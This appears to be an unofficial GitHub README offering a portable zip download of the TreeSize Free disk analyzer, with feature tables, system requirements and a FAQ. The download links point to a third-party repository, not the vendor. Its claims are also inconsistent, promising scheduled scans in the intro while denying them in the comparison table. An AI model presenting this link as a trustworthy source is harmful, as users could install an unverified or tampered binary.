# TreeSize Free 4.8.1 Download for Windows — Disk Space Analyzer (x64)

**TreeSize Free** shows where the space on a drive actually went. It scans a folder or an entire volume and returns a sorted tree with sizes, percentages and a treemap — so the 40 GB nobody can account for turns into three named folders in a few seconds.

<p align="center">
  <a href="https://github.com/TreeSizeSoft/treesize-download/releases/latest/download/TreeSizeFree-4.8.1-Windows.zip">
    <img src="https://img.shields.io/badge/DOWNLOAD-TreeSize_Free_4.8.1_%C2%B7_15_MB-2E7D32?style=for-the-badge&logo=windows&logoColor=white" alt="Download TreeSize Free">
  </a>
</p>

| | |
|---|---|
| **Version** | 4.8.1 (Free edition) |
| **Package** | `TreeSizeFree-4.8.1-Windows.zip` — 15.0 MB |
| **Platform** | Windows 10 / 11, Windows Server 2016+ (64-bit) |
| **Format** | Portable archive — unpack and run |

## Download

| Package | Size | Link |
|---|---|---|
| **TreeSize Free 4.8.1 (portable)** | 15.0 MB | [Download](https://github.com/TreeSizeSoft/treesize-download/releases/latest/download/TreeSizeFree-4.8.1-Windows.zip) |

Scan results export to CSV, Excel, XML and PDF, and the same filters can run on a schedule through Windows Task Scheduler — useful for watching a share grow week over week instead of scanning it by hand each time.

## Works with

| | |
|---|---|
| OS | Windows 10 / 11, Windows Server 2016 and newer |
| Architecture | x64 |
| RAM | 256 MB (scans of very large volumes use more) |
| Disk | ~50 MB unpacked |
| File systems | NTFS (MFT scan), FAT32/exFAT (directory walk) |
| Rights | Administrator for full coverage of protected folders |

## SHA-256 checksum

```
0E302AA6107B5C8D85C9A8BD14DF96B1B830855C9686A4DCC352B41E2C69BBE0  TreeSizeFree-4.8.1-Windows.zip
```

```powershell
Get-FileHash .\TreeSizeFree-4.8.1-Windows.zip -Algorithm SHA256
```

## Install

### Portable — nothing to install

1. Download the archive above.
2. Verify the SHA-256.
3. Unpack to a folder — for example `D:\Tools\TreeSizeFree`.
4. Run `TreeSizeFree.exe`.

### Optional Explorer integration

Inside the program: **Tools → Options → Context menu entry** to add "Scan with TreeSize" to the right-click menu in Explorer.

### Scanning a protected volume

Windows will not let a standard process read `C:\Windows\System32\config` or other system folders. Use **Scan → As Administrator** — the program relaunches elevated and the totals become complete.

## What it does

Windows Explorer tells you a folder is 300 GB. It does not tell you which subfolder is responsible. TreeSize walks the directory tree once, aggregates sizes bottom-up, and presents the result three ways: a sortable tree, a bar chart per folder, and a treemap where rectangle area equals disk usage.

On NTFS volumes TreeSize can read the Master File Table instead of walking the tree — an order of magnitude faster on multi-terabyte drives, and the only practical way to scan a volume with millions of files.

### Where it earns its place

- **A server filled up overnight.** Scan `C:\` as administrator, sort by size, find the folder that grew.
- **Before a backup.** See what would actually be copied, and what is just a 60 GB `pagefile.sys`.
- **Per-user storage reports.** TreeSize Professional does quota reports; the Free edition answers "who is using the disk".

### Features

| Feature | Details |
|---|---|
| Sorted size tree | Every folder with size, percentage and file count |
| Treemap | Rectangle area proportional to folder size |
| Bar chart | Size comparison across subfolders |
| NTFS MFT scan | Reads the file table directly — far faster on large volumes |
| Administrator scan | Full access to protected folders via elevation |
| Windows Explorer integration | "Scan with TreeSize" in the context menu (optional) |
| Portable mode | No installation, runs from any folder or USB stick |
| Multiple drives | Scan several paths one after another in the same window |
| Export | Save results for a report (Free: limited) |
| Search | Find a file inside the scanned tree |

### Free vs Professional

| | Free | Professional |
|---|---|---|
| Folder and drive scans | Yes | Yes |
| Treemap and charts | Yes | Yes |
| NTFS MFT scan | Yes | Yes |
| Scanning network drives | Yes | Yes |
| Export and reporting | Limited | Yes |
| File search inside the scan | Basic | Extended |
| Duplicate file search | No | Yes |
| Scheduled scans, quotas, SQL export | No | Yes |

## FAQ

**Is TreeSize Free really free?**
The Free edition is free for personal and commercial use. Professional adds reporting, duplicate search, scheduled scans and quota management.

**Why does the total differ from the size Windows reports?**
Windows counts allocated space differently and includes system files (pagefile, hibernation) your account cannot read. Run the scan as administrator for the complete figure.

**What is the MFT scan?**
Reading the NTFS Master File Table instead of walking directories. It is much faster on large volumes with many files.

**Can it scan a network share?**
Yes, but the MFT method only works on local NTFS volumes; network scans walk the directory tree.

**Does it delete files?**
It can delete from inside the tree, but the Free edition is primarily an analysis tool. Check twice before removing anything from `C:\Windows`.

**Is there a portable version?**
Yes — the archive published here is the portable build, no installer.

**Windows 11 supported?**
Yes, including the current 24H2 builds.

**How long does a scan take?**
A 500 GB volume with a few hundred thousand files: seconds with the MFT scan, a minute or two with a directory walk.

## Version history

| Version | Notes |
|---|---|
| **4.8.1** | current Free build published in this repository |
| 4.8.x | maintenance line |
| 4.7 | previous feature release |

## Disclaimer

This repository distributes the Windows build for offline installation and archive purposes. All product names and trademarks belong to their respective owners.
